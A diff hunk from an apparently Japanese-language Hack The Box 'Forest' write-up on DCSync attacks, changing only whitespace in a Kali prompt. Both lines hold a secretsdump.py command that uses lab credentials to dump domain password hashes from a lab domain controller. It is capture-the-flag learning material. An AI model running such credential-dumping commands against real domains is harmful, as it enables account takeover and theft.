@@ -119,7 +119,7 @@ DCSync攻撃とは？...**自分がドメインコントローラになりすま
 と設定してから
 
 ```
-┌──(kali㉿kali)-[~]                                                                                                                                                  └─$ secretsdump.py 'htb.local/harmj0y:Passw0rd!@10.10.10.161'
+┌──(kali㉿kali)-[~]                                                                                                                                         └─$ secretsdump.py 'htb.local/harmj0y:Passw0rd!@10.10.10.161'
 ```
 
 を実行するとうまくいくかも（ここ：https://ranakhalil101.medium.com/hack-the-box-forest-writeup-w-o-metasploit-63070c9020e4 ではそうしてた。）
